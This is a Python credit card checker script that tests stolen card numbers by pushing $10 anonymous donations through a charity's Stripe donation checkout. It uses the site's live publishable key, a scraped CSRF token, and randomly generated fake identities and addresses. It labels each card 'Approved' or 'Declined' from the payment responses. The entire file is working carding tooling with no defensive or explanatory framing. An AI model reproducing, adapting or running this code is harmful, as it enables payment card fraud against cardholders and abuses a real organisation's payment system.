import requests
import random
import names
from random_address import real_random_address
import re

direc = real_random_address()

zipcode = direc['postalCode']
try:city = direc['city']
except KeyError:city = 'NY'

state = direc['state']
street = direc['address1']


   
class Stripe:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
    
        

    def main(self):       
        vendor = self.detectar_tipo_tarjeta()
        session = requests.Session()
        
        #---------REQ0---------#
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        response = session.post('https://m.stripe.com/6', headers=headers).json()
        muid = response['muid']
        guid = response['guid']
        sid = response['sid']
        
        #---------REQ1---------#
        
        headers = {
            'authority': 'www.charitywater.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://www.charitywater.org/donate-au',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }
        response = session.get('https://www.charitywater.org/', headers=headers)
        token = re.search(r'name="csrf-token" content="([^"]+)', response.text).group(1)
        
        data = f'type=card&billing_details[address][postal_code]={zipcode}&billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street}&billing_details[email]={self.CorreoRand}&billing_details[name]={self.username}+{self.username}&card[number]={self.cc}&card[cvc]={self.cvv}&card[exp_month]={self.mes}&card[exp_year]={self.ano}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2F58{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page={random.randint(10,999999)}&&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'

        r2 = session.post('https://api.stripe.com/v1/payment_methods', data=data)
        
        if 'error' in r2.text: return print("DECLINED❌\n" + r2.json()['error']['message'])

        id_ = r2.json()['id']


        headers = {
            'authority': 'www.charitywater.org',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.charitywater.org',
            'referer': 'https://www.charitywater.org/donate',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': token,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'country': 'us',
            'payment_intent[email]': self.CorreoRand,
            'payment_intent[amount]': '10',
            'payment_intent[currency]': 'usd',
            'payment_intent[metadata][analytics_id]': 'b6e79e43-1c00-4978-9874-c62adff3d58b',
            'payment_intent[payment_method]': id_,
            'disable_existing_subscription_check': 'false',
            'donation_form[amount]': '10',
            'donation_form[anonymous]': 'true',
            'donation_form[comment]': '',
            'donation_form[display_name]': '',
            'donation_form[email]': self.CorreoRand,
            'donation_form[name]': self.username,
            'donation_form[payment_gateway_token]': '',
            'donation_form[payment_monthly_subscription]': 'false',
            'donation_form[surname]': self.username,
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[analytics_uuid]': 'b6e79e43-1c00-4978-9874-c62adff3d58b',
            'donation_form[setup_intent_id]': '',
            'donation_form[subscription_period]': '',
            'donation_form[profile_campaign_id]': '',
            'donation_form[metadata][address][address_line_1]': street,
            'donation_form[metadata][address][address_line_2]': '',
            'donation_form[metadata][address][city]': city,
            'donation_form[metadata][address][country]': '',
            'donation_form[metadata][address][zip]': zipcode,
            'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
            'donation_form[metadata][experiments][experiment_22723142537][experiment_id]': '22723142537',
            'donation_form[metadata][experiments][experiment_22723142537][experiment_name]': 'Gift language patch until eng implements',
            'donation_form[metadata][experiments][experiment_22723142537][variant_name]': 'Original',
            'donation_form[metadata][experiments][experiment_26587952198][experiment_id]': '26587952198',
            'donation_form[metadata][experiments][experiment_26587952198][experiment_name]': 'Will showing the donate form above the fold increase CVR on the US EOYG 2023 homepage? ',
            'donation_form[metadata][experiments][experiment_26587952198][variant_name]': 'Beyond the Fold',
            'donation_form[metadata][experiments][experiment_26650531191][experiment_id]': '26650531191',
            'donation_form[metadata][experiments][experiment_26650531191][experiment_name]': 'EOYG 2023 Nav Button Spring -> WPS',
            'donation_form[metadata][experiments][experiment_26650531191][variant_name]': 'Variation #1',
            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
            'donation_form[metadata][phone_number]': '',
            'donation_form[metadata][phone_number_consent_granted]': '',
            'donation_form[metadata][plaid_account_id]': '',
            'donation_form[metadata][plaid_public_token]': '',
            'donation_form[metadata][referer]': '',
            'donation_form[metadata][send_default_welcome_series_emails]': 'true',
            'donation_form[metadata][url_params][touch_type]': '1',
            'donation_form[metadata][with_saved_payment]': 'false',
        }

        r3 = session.post('https://www.charitywater.org/donate/stripe',headers=headers, data=data)
        
        response_data = r3.json()

        response_code = response_data.get('error', {}).get('message', '').lower()

        if "your card's security code or expiration date is incorrect." in response_code: return response_code, 'Approved ✅'
        elif "Your card has insufficient funds." in response_code: return response_code, 'Approved ✅'
        elif "success" in response_code: return  'Approved ✅', "Charge 10$"
        elif "/thank_you" in str(r3.url) or "/orders/" in str(r3.url) or "/post_purchase" in str(r3.url): return 'Approved ✅','Charged 10$'
        elif "/3d_secure_2/" in str(r3.url): return '3d_secure_2',  "Declined❌"
        else: return response_code, "Declined❌"

